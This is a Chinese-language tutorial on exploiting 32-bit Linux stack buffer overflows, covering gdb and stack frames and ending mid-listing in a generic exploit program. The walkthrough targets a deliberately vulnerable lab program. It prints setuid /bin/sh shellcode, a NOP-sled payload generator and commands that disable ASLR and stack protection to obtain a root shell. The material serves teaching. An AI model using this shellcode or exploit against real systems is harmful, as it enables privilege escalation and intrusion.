# Linux 缓冲区溢出攻击

## 1 GDB

在 unix 系统上分析可执行程序，首选调试器为 gdb，它提供了可靠的命令行界面，可以在运行程序的同时保持完整的控制。

gdb是漏洞分析的绝佳工具，可以分析程序运行过程中内存的变化信息。

GDB默认为AT&T汇编，如果习惯Intel汇编的，可以进行以下配置：

```
set disassembly-flavor intel   
set disassembly-flavor att     # 改为 att
```

使用配置文件，就不用每次都输入上述命令了。在家目录或当前目录新建文件 .gdbinit，输入以下内容:

```
set disassembly-flavor intel
```

这样每次启动 gdb 就会自动执行 .gdbinit 里的配置命令

## 2 栈操作

栈是一种常见的数据结构，它的特点是先入后出，将条目放入栈的操作称为压栈（push），在汇编语言中是通过 push 命令完成。从栈上取出条目的过程称为弹栈（pop），在汇编代码中通过 pop 命令实现。

在内存中，每个进程都有自己的栈，栈是从高地址向低地址增长的。有两个重要的寄存器负责栈的处理：EBP(基址指针)和ESP(栈顶指针)，一次函数调用将产生一个栈帧，EBP是当前栈帧的基址，通过EBP可以获取函数的参数和局部变量等相关信息，ESP是变化的值，总是指向栈顶。

```
+--------------------------------------+
｜             |    栈帧    |           ｜
+--------------------------------------+
低内存地址      ESP         EBP      高内存地址
0x11111111									0xfffffff0
```

## 3 函数调用过程

x86函数调用，在汇编层面，函数调用就是过程调用。通过改变指令指针寄存器来实现过程调用和返回。x86 用 call 指令来调用某个过程。

下面以调用 foo 函数为例子：

1. 在调用 call 之前，需要先将函数参数从右到左依次压入栈中。
2. 随后调用call指令，它将call指令之后的指令地址压入栈中，然后改变eip，让其指向 foo 的地址。
3. 在foo函数中，在从栈中分配局部变量前，需要先保存ebp，它是发出调用函数的栈基址，我们不能改变它。
4. 在foo函数末尾，首先调用 leave 指令关闭当前栈帧，它将ebp寄存器的值拷贝到esp，然后在从栈中弹出栈顶元素到ebp中，用汇编指令表示就是：`mov esp,ebp ; pop ebp`。随后调用ret 返回，它将栈顶元素弹出到eip中，用汇编指令表示就是：`pop eip`。随后代码从call指令之后的地址开始执行。
5. 在调用完foo之后，需要清理传递参数所使用的栈空间，通过将esp加上一定的值实现。

### 3.1 具体过程

汇编语言使用 call 指令进行函数调用，它主要完成两个操作：1、将返回地址压入堆栈，2、把调用过程的地址复制到指令指针寄存器，这样CPU就自动跳转到指定的过程去执行。在调用call之前，需要将函数参数以逆序压入堆栈，例如调用 foo(int a,int b)，从右向左，依次将b,a压入堆栈。完整过程以func.c为例：

```c
// func.c
int foo(int a,int b){
    int sum = a+b;
    int num = -sum;
    return num;
}
int main(){
    int a = 10;
    int b = 20;
    int x = foo(a,b);
    return 0;
}
```

在Linux 平台使用以下命令编译：

```
gcc -g -m32 -o func func.c    # -g 选项添加调试信息，-m32 生成32位可执行程序，-o 指定可执行程序名称，默认位 a.out
```

main 函数定义了三个局部变量 a,b,x，然后调用 foo，将foo 的返回值存入x。下面是使用GDB对main进行反汇编，其foo的调用代码如下：

```asm
...
   0x565561c5 <+16>:	mov    DWORD PTR [ebp-0x4],0xa      ; 变量 a 赋值
   0x565561cc <+23>:	mov    DWORD PTR [ebp-0x8],0x14     ; 变量 b 赋值
   0x565561d3 <+30>:	push   DWORD PTR [ebp-0x8]          ; 将变量 b 压入栈中       
   0x565561d6 <+33>:	push   DWORD PTR [ebp-0x4]				; 将变量 a 压入栈中
   0x565561d9 <+36>:	call   0x5655618d <foo>             ; 调用 foo 函数
   0x565561de <+41>:	add    esp,0x8                      ; 清理栈空间，为了传递参数使用了8字节的空间
   0x565561e1 <+44>:	mov    DWORD PTR [ebp-0xc],eax      ; 将函数的返回值存储到
   0x565561e4 <+47>:	mov    eax,0x0                      ; 设置返回值
   0x565561e9 <+52>:	leave  
   0x565561ea <+53>:	ret    
...
```

首先将20和10分别压入栈中，然后调用call指令，将返回地址 0x565561de 压入堆栈，然后将0x5655618d 复制到 eip。随后程序跳转到 foo 执行。

foo的汇编代码如下：

```asm
   0x5655618d <+0>:	push   ebp            ;  保存上一个函数的栈帧基址
   0x5655618e <+1>:	mov    ebp,esp        ;  保存当前函数栈帧基址
   0x56556190 <+3>:	sub    esp,0x8        ;  将栈顶置针下移8个字节空间，为sum和num分配空间。
   0x56556193 <+6>:	call   0x565561eb <__x86.get_pc_thunk.ax>
   0x56556198 <+11>:	add    eax,0x2e68
=> 0x5655619d <+16>:	mov    edx,DWORD PTR [ebp+0x8]    ; 获取参数 a，将其保存到 edx
   0x565561a0 <+19>:	mov    eax,DWORD PTR [ebp+0xc]    ; 获取参数 b，将其保存到 eax
   0x565561a3 <+22>:	add    eax,edx                    ; eax = eax+edx
   0x565561a5 <+24>:	mov    DWORD PTR [ebp-0x4],eax    ; 将 a+b 的和保存到 sum 中
   0x565561a8 <+27>:	mov    eax,DWORD PTR [ebp-0x4]    ; 将 sum 的值保存到 eax
   0x565561ab <+30>:	neg    eax                        ; 将 eax 变为相反数
   0x565561ad <+32>:	mov    DWORD PTR [ebp-0x8],eax    ; 将 eax 存储到 num 中
   0x565561b0 <+35>:	mov    eax,DWORD PTR [ebp-0x8]    ; 将 num 的值存储到 eax 中作为返回值
   0x565561b3 <+38>:	leave  
   0x565561b4 <+39>:	ret  
```

首先将上一个过程的栈帧寄存器压入堆栈中，然后将当前的栈指针寄存器esp复制到ebp，保存当前栈帧寄存器。当执行到0x5655619d，此时的栈内存如下所示：

```
					+----------------+
					|      ...       |
					|----------------|
					|     参数 b      |
					|----------------|
					|     参数 a      |
					|----------------|
					|返回地址0x565561de|    <----- call 自动调用
					|----------------|
    当前栈帧地址      |    main ebp    |     <-----  push   ebp
    -------->	    |----------------|
					|    变量 sum     |
					|----------------|
					|    变量 num     |
					|----------------|
					|     ...        |
					+----------------+
```

在 foo 函数的末尾，依次执行了leave和ret，其中leave指令用于关闭当前栈帧，它主要完成两个操作，1、mov esp,ebp，2、pop ebp。ret 用于返回，它将执行：pop eip。

foo 函数返回后，指令执行流将跳转到0x565561de继续执行。在main 函数中，执行以下汇编代码：

```asm
   0x565561de <+41>:	add    esp,0x8                     ; 清理函数形数占用的栈空间
   0x565561e1 <+44>:	mov    DWORD PTR [ebp-0xc],eax     ; 将返回值保存到 x 变量中，x变量的地址为 ebp-0xc
   0x565561e4 <+47>:	mov    eax,0x0                     ; 将 0 保存到 eax 中作为函数返回 
   0x565561e9 <+52>:	leave                              ; 将 ebp的值复制到esp，并弹出栈顶元素到 ebp 中，恢复上一层函数的栈帧基址
   0x565561ea <+53>:	ret                                ; 此时 esp 指向返回地址，将栈顶元素弹出到 eip 实现返回。
```

add    esp,0x8 清理传递参数所使用的栈空间，两个参数占用了8字节内存空间，因此将 esp 加上8将清理这些空间。x86汇编规定，谁调用，谁负责清理参数所占用的空间。

## 4 缓冲区溢出

缓冲区用于在内存中存储数据，缓冲区本身没有任何基址阻止将过多的数据存放到预留的空间中，实际上，如果程序员很粗行，那么很容易就会用完所分配的内存大小。例如，下面的代码声明了一个10字节大小字符缓冲区：`char str1[10];`

如果执行下面的语句会发生什么呢？`strcpy(str1,"AAAAAAAAAAAAAAAAAAA")`

现观察以下程序的运行情况：

```c
#include <string.h>
#include <stdio.h>

int main(){
    char str1[10];
    strcpy(str1,"AAAAAAAAAAAAAAAAAAAA");
    return 0;
}
```

使用以下命令进行编译：

```shell
gcc -g -m32 -mpreferred-stack-boundary=2 -fno-stack-protector -o overflow
# -g 添加调试信息，-m32，生成 32 位可执行程序
# -mpreferred-stack-boundary=2 将栈顶指针以四字节对齐，若为 64 位，则应该设置为 4
# -fno-stack-protector 禁用gcc堆栈保护，默认是启用的，它通过在栈中某些位置插入以下签名信息，在函数返回时验证签名，发现缓冲区溢出就会自动退出进程。
```

现在执行 overflow

```
$ ./overflow
zsh: segmentation fault  ./overflow
```

通过输出可知，发生了段错误，表明缓冲区溢出了。下面使用 gdb 来寻找程序崩溃的原因：

```
(gdb) run
Starting program: /home/kali/hacker/GrayHatHacking/overflow 

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) info reg eip
eip            0x41414141          0x41414141
```

通过以上信息可知，当程序在试图执行 0x41414141 时崩溃，这恰好是 AAAA 的十六进制编码。通过查看 eip 寄存器的值可知，函数的返回值因为缓冲区溢出被破坏了。因为地址0x41414141不在当前进程可访问的地址空间之内，所以导致了段错误。

较新版本的的 Linux 内核通过某些机制来将地址空间布局随机化(address space layout randomization, ASLR)，从而在一定程度上增大缓冲区溢出的难度。通过以下命令禁用 ASLR，该操作需要 root 权限。

```
echo 0 > /proc/sys/kernel/randomize_va_space
```

### 4.1 溢出示例

现以以下程序作为攻击对象：

```c
// meet.c
#include <stdio.h>
#include <string.h>

greeting(char *temp){
    char name[400];
    strcpy(name,temp);
    printf("Hello %s\n",name);
}

main(int argc, char* argv[]){
    greeting(argv[1]);
}
```

我们可以使用 makefile 来简化编译过程：

```makefile
CFLAGS = -ggdb -fno-stack-protector -z execstack -mpreferred-stack-boundary=2 -m32 

src = $(wildcard *.c)
target = $(patsubst %.c, %, ${src})

.PHONY: all clean

%.o:%.c
	gcc ${CFLAGS} -c -o $@
%:%.o
	gcc ${LDFLAGS} -o $@

all: ${target}

clean:
	rm -f ${target}
```

这样，我们只需执行`make`，就可以编译所有的`.c`文件。

```
$ make
$ ./meet AAAA
Hello AAAA
```

为了让 mmet.c 程序中的 400 字节缓冲区溢出，我们可以使用 python 来生成所需的参数，python 是一门强大，语法简洁，解释型的脚本语言，我们不需要提前编译就可以运行 python 程序。

使用 -c 参数，我们可以在控制台直接执行 python 代码：

```
$ python -c 'print("Hello World!")'    
Hello World!
```

我们可以借助 python 构建我们需要的参数。例如，使用以下命令生成超过400字节的字符串：

```
$ python -c 'print("A"*600)'       
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

现在我们向 meet 程序灌入600个字符A（作为参数）：

```
$ ./meet $(python -c 'print("A"*600)')
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
zsh: segmentation fault  ./meet $(python -c 'print("A"*600)')
```

可以看到，那 400 字节的缓冲区溢出了，如果顺利的话，函数的返回地址 eip 已经充满了 0x41414141。我们可以使用 gdb 验证：

```
(gdb) run $(python -c 'print("A"*600)')
Starting program: /home/kali/hacker/GrayHatHacking/meet $(python -c 'print("A"*600)')
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) info reg eip
eip            0x41414141          0x41414141
```

我们不仅控制了 eip，而且已经将程序控制转移到了内存中另一处很远的地方。当函数进入 greeting 中时，其栈帧，既函数调用的状态如下所示：

```
										局部变量
+----------------------------------------------+
｜         ｜ ESP |  name  ｜ EBP | EIP| temp  ｜
+----------------------------------------------+
低内存地址                                 高内存地址
0x11111111									       0xfffffff0
```

通过源码，我们知道在 greeting 函数中的 strcpy()函数之后有一个 printf() 函数调用，这个printf 又调用 libc 库中的 vfprintf()，vfprintf() 函数又调用 strlen。这里进行了多次嵌套函数调用，因此存在多个栈帧，每一个栈帧都被压入栈中。当溢出时，可能会导致传入函数的参数被破坏掉，上述溢出不仅写入旧的 eip，还将函数参数覆盖了。由于 printf() 函数会使用 temp，因此会遇到问题。下面使用gdb验证。

```
(gdb) l
1	#include <stdio.h>
2	#include <string.h>
3	
4	int greeting(char *temp2){
5	    char name[400];
6	    strcpy(name,temp2);
7	    printf("Hello %s\n",name);
8	    return 0;
9	}
10	
(gdb) b 7
Breakpoint 1 at 0x565561d4: file meet.c, line 7.
(gdb) run $(python -c 'print("A"*600)')
Starting program: /home/kali/hacker/GrayHatHacking/meet $(python -c 'print("A"*600)')
Breakpoint 1, greeting (temp2=0x41414141 <error: Cannot access memory at address 0x41414141>) at meet.c:7
7	    printf("Hello %s\n",name);
```

可以看出传给函数的参数 temp 已经被破坏了，temp 现在指向 0x41414141，而值为""。问题在于 printf 不会将空值作为唯一的输入并停止。下面从较低数目的A(如 401)开始，然后慢慢增加，直到eip刚好被覆盖为止。

```
(gdb) run $(python -c 'print("A"*401)')
Starting program: /home/kali/hacker/GrayHatHacking/meet $(python -c 'print("A"*401)')
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 1, greeting (temp2=0xffffd4af 'A' <repeats 200 times>...) at meet.c:9
9	}
(gdb) x/8x $ebp
0xffffd25c:	0xffffd268	0x5655620f	0xffffd4af	0x00000000
0xffffd26c:	0xf7dda905	0x00000002	0xffffd314	0xffffd320
(gdb) run $(python -c 'print("A"*405)')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/kali/hacker/GrayHatHacking/meet $(python -c 'print("A"*405)')
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 1, greeting (temp2=0xffffd4ab 'A' <repeats 200 times>...) at meet.c:9
9	}
(gdb) x/8x $ebp
0xffffd25c:	0xffff0041	0x5655620f	0xffffd4ab	0x00000000
0xffffd26c:	0xf7dda905	0x00000002	0xffffd314	0xffffd320
(gdb) run $(python -c 'print("A"*412)')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/kali/hacker/GrayHatHacking/meet $(python -c 'print("A"*412)')
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 1, greeting (temp2=0xffffd400 "\v") at meet.c:9
9	}
(gdb) x/8x $ebp
0xffffd24c:	0x41414141	0x41414141	0xffffd400	0x00000000
0xffffd25c:	0xf7dda905	0x00000002	0xffffd304	0xffffd310

```

通过下面函数调用调用的栈内存布局可知，栈帧基址寄存器EBP处的内存地址为上一个栈帧基址寄存器的值，然后是函数的返回地址。通过命令 x/8x $ebp，我们就可以看到上一个栈帧的基址寄存器的值和函数的返回地址。通过对上述输出的分析，我们知道只需412个字节，就可以刚好覆盖函数的返回地址EIP。这样当执行 ret 命令后，就会跳转到这个地址。

```
										局部变量
+----------------------------------------------+
｜         ｜ ESP |  name  ｜ EBP | EIP| temp  ｜
+----------------------------------------------+
低内存地址                   当前EBP         高内存地址
0x11111111									       0xfffffff0
```



### 4.2 缓冲区溢出的后果

缓冲区溢出会造成以下三种后果。

首先是拒绝服务，通常表现为段故障。对于软件开发人员来说，出现这个结果可能是不幸中的万幸了，因为程序崩溃会引起注意，而其它情况可能不会引起注意，从而引发严重的后果。

然后可能发生的情况是 eip 可能被控制并以用户级访问权限执行恶意代码。

最糟糕的情况是，eip 被控制并在 root 权限上执行恶意代码。在 Unix 系统中，只有一个名为 root 的超级用户，根用户可以在系统上执行任何操作。在 Unix 系统中，有些函数应该受到保护，只有根用户才能执行这些函数。例如，一般不会让用户具有修改口令的根特权， 因而产生了 SUID（Set User ID）概念，它用于临时提升某个进程的权限，从而运行某些文件在它们自己的特权级下执行，例如 passwd 命令由根用户持有，但是根用户可以将该命令设置为 SUID，这样普通用户执行该命令时，就以根用户身份运行。这里的问题在于，当 SUID 程序存在漏洞时，漏洞攻击程序就可以获得该文件拥有者的特权，最糟糕的情况下获取根特权。

将某个程序变为 SUID ，使用以下命令：

```
chmod u+s meet     # 将 meet 设置为 SUID
```

## 5本地缓冲区溢出漏洞攻击

本地漏洞攻击要比远程漏洞攻击容易，因为在本地能够访问内存空间，而且能够容易地调试漏洞攻击代码。缓冲区溢出漏洞攻击的基本概念是，让存在漏洞的缓冲区溢出，然后出于恶意目的修改EIP，EIP表示下一条要执行的指令。如果能够影响所保存的EIP值，那么当函数返回时，从栈上弹出到寄存器EIP并执行的将是被破坏的EIP值。

缓冲区溢出攻击的成功实施通常源于某些特定的输入，为了构建一次有效的漏洞攻击，需要构建一个尺寸比程序期望更大的输入字符串，该字符串通常包含以下几个组成部分：

### 5.1 漏洞攻击组成部分

#### 5.1.1 NOP 雪橇

在汇编代码中，NOP命令（NO Operation，空操作）意味着不执行任何操作，而只是移动到下一条命令。在汇编代码中编译器使用该操作进行优化，为代码块增加垫片，从而实现字节边界对其。黑客们已经学会使用 NOP 来实现垫片，当把NOP放在漏洞攻击缓冲区前面时，它被称为NOP雪橇。如果EIP指向NOP雪橇，那么处理器将“踏着”雪橇滑入下一个组成部分。在 x86 架构系统中，操作码 0x90 表示 NOP。实际上还有其它几种表示方法，但 0x90 是最常用的一种。

#### 5.1.2 Shellcode

术语 shellcode 专门用于表示那些将执行黑客命令的机器代码，最初，人们使用这个术语的原因是，恶意代码的目的曾是为黑客提供一个 shell。如今这个术语经过不断发展，它包含代码已经不仅仅是提供一个 shell，还包括类似提升权限或者在远程系统中执行一条命令。

Shellcode 实际上是汇编代码对应的二进制代码，通常用十六进制表示。网上有非常多的 shellcode 库，可用于所有平台。下面的程序演示了如何使用 shellcode 在存在漏洞的系统中执行动作。

```c
// shellcode.c
int main(){
    int *ret;
    ret = (int*)&ret+2;
    char shellcode[] =
       "\x31\xc0\x31\xdb\xb0\x17\xcd\x80"
       "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
       "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\31\xdb\x89\xd8\x40\xcd"
       "\x80\xe8\xdc\xff\xff\xff/bin/sh";
    (*ret) = (int)shellcode;
    return 0;
}
```

使用 make命令 编译并运行该程序：

```
┌──(kali㉿bad)-[~/hacker/GrayHatHacking]
└─$ sudo make        
cc -ggdb -O0 -fno-stack-protector -zexecstack -mpreferred-stack-boundary=2 -m32     shellcode.c   -o shellcode
                                                                                                 
┌──(kali㉿bad)-[~/hacker/GrayHatHacking]
└─$ sudo chmod u+s shellcode
                                                                                                 
┌──(kali㉿bad)-[~/hacker/GrayHatHacking]
└─$ ./shellcode
# 

```

成功，获得了根shell

> 经过测试，shellcode 只有位于 main 函数内才能执行，放到 main 函数外无法执行，会产生段错误。因为将shellcode 放到 main 函数外，其位于 data 段， Linux 系统不允许 data 段作为指令执行。

#### 5.1.3 重复返回地址

漏洞攻击最重要的因素就是返回地址，必须完美地将其覆盖，这样才能在执行 ret 指令后，跳转到我们指定的地址处。尽管我们可以直接指向 shellcode 的起始处，但我们也可以将其指向 NOP雪橇的中间某个位置，这样处理器也会像滑雪橇一样滑到我们指定的地址处。为了达到上述目的，我们要做的第一件事就是获取当前 esp 的值，在 gcc 中内联汇编代码可以获取寄存器的值，如下所示：

```c
// get_sp.c
#include <stdio.h>

unsigned int get_sp(void){
    __asm__("movl %esp,%eax");
}

int main(){
    printf("Stack Pointer (ESP):0x%x\n",get_sp());
}
```

编译执行

```
┌──(kali㉿bad)-[~/hacker/GrayHatHacking]
└─$ gcc -m32 -o get_sp get_sp.c 
                                                                                                 
┌──(kali㉿bad)-[~/hacker/GrayHatHacking]
└─$ ./get_sp   
Stack Pointer (ESP):0xfff4bd28
```

我们需要检查一下系统是否开启了地址空间布局随机化(address space layout randomization, ASLR)，只需多次执行 get_esp 就可以验证：

```
┌──(kali㉿bad)-[~/hacker/GrayHatHacking]
└─$ ./get_sp
Stack Pointer (ESP):0xffd087f8
                                                                                                 
┌──(kali㉿bad)-[~/hacker/GrayHatHacking]
└─$ ./get_sp
Stack Pointer (ESP):0xfffc8308
                                                                                                 
┌──(kali㉿bad)-[~/hacker/GrayHatHacking]
└─$ ./get_sp
Stack Pointer (ESP):0xffde2e88
```

可以看到每次运行，其 ESP 都不一样，说明系统开启了 ASLR。

之后再讨论绕开该机制的方法，为了便于讨论本章的主题，先禁用 ASLR，在 root 权限下执行以下命令：

```
# echo "0"> /proc/sys/kernel/randomize_va_space
```

下面再次检查：

```
┌──(kali㉿bad)-[~/hacker/GrayHatHacking]
└─$ ./get_sp
Stack Pointer (ESP):0xffffd438
                                                                                                 
┌──(kali㉿bad)-[~/hacker/GrayHatHacking]
└─$ ./get_sp
Stack Pointer (ESP):0xffffd438
                                                                                                 
┌──(kali㉿bad)-[~/hacker/GrayHatHacking]
└─$ ./get_sp
Stack Pointer (ESP):0xffffd438
```

现在我们已经可靠地找到了当前 esp，从而能够估算出有漏洞缓冲区的顶部。

将以上 3 个组件组合在以下，其结构如下所示，看起来像一个三明治：

```

        --------------------------------------+
        |                                     ｜
        |                                     ｜
        +------>                              |
+----------------------------------------------------+
｜    NOP雪橇    ｜     shellcode     |     重复地址   ｜
+----------------------------------------------------+
+----------------------------------------------------+
｜   存在漏洞的缓冲区                       ｜ EBP | EIP｜
+----------------------------------------------------+
低内存地址                                       高内存地址
```

如上图所示，重复的地址覆盖了 eip，并指向 NOP 雪橇，然后它将会滑入 shellcode。

### 5.2  在命令行上进行栈溢出漏洞攻击

根据 4.1 节的讨论，我的攻击缓冲区的理想大小是 408字节。

> 局部缓冲区的内存在栈上分配，通过将 esp 减去一定的数值来实现，由于内存对齐等因素，缓冲区的理想大小在其它系统可能存在一定的差异。

首先获取ESP的值，从而去估算出有漏洞缓冲区的顶部。

```
┌──(kali㉿bad)-[~/hacker/GrayHatHacking]
└─$ ./get_sp        
Stack Pointer (ESP):0xffffd448
```

我们将上述得到的 ESP 值减去 0x200 作为登录点，这个值是预估值。

```
retaddr = 0xffffd448-0x200=0xffffd138
```

我们使用一个 python 脚本来生成攻击字符串：

```
#!/usr/bin/env python

# shellcode.py

nob = b'\x90'*199     # 在缓冲区的前面放入足够的 NOP
shellcode =           # shellcode b'\x30\xc0\x31\xdb\xb0\x17\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh'
retaddr=b'\x38\xd1\xff\xff'*40    # 填充返回地址，以小端序填充

with open('sc','wb') as f:
    f.write(nob+shellcode+retaddr)
```

> 关于 NOP 和 shellcode 的数目，这个是比较灵活的，通常在放下 shellcode 的情况下，尽可能放下更多的 NOP，并且 NOP 加上 shellcode 的数目要为 4 的倍数。在字符串的最后要以小端序放下多个预估的登录点。
>
> 一般情况下，不会一次成功，只需慢慢增加 NOP的数目，让 retaddr 刚好覆盖函数的返回地址。
>
> 这样我们就构建了 199+53+40*4=412 个攻击缓冲区字符串。

```
┌──(kali㉿bad)-[~/hacker/GrayHatHacking]
└─$ ./shellcode.py  
                                                                                
┌──(kali㉿bad)-[~/hacker/GrayHatHacking]
└─$ ./meet $(cat sc)
Hello ???????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????0?1۰̀?^?1??F?F
                                                          ?
                                                           ???V
                                                               ̀ۉ?@̀?????/bin/sh8???8???8???8???8???8???8???8???8???8???8???8???8???8???8???8???8???8???8???8???8???8???8???8???8???8???8???8???8???8???8???8???8???8???8???8???8???8???8???8???
$ 
```

我们成功获得了shell。

### 5.3 通用漏洞攻击代码

下面的代码能够在多种场合下进行漏洞攻击。

```c
// exploit.c
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

char shellcode[] =
        "\x31\xc0\x31\xdb\xb0\x17\xcd\x80"
        "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
        "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\31\xdb\x89\xd8\x40\xcd"
        "\x80\xe8\xdc\xff\xff\xff/bin/sh";


unsigned long get_sp(void){
    __asm__("movl %esp,%eax");
}

int main(int argc,char *argv[]){          // main function
    int offset=0;         // 选择一个特定的偏移，将ESP 减去该偏移获得返回地址                    
    unsigned long esp,ret,*addr_ptr;   
    char *buffer,*ptr;
    int size = 500;

    esp = get_sp();

    if(argc > 1 ) size = atoi(argv[1]);
    if(argc > 2 ) offset = atoi(argv[2]);
    if(argc > 3 ) esp = strtoul(argv[3],NULL,0);
    ret = esp-offset;

    fprintf(stderr,"Usage: %s <buff_size> <offset> <esp:0xfff...>\n",argv[0]);

    fprintf(stderr,"ESP:0x%x Offset:0x%x Return:0x%x\n",esp,offset,ret);
    buffer = (char*)malloc(size);    // 加1是因为需要一个额外的字节存储 '\0'
    ptr = buffer;
    addr_ptr = (unsigned long*)ptr;

    for(int i=0; i<size; i+=4){    // 先将缓冲区填满 ret
        *(addr_ptr++)=ret;
    }

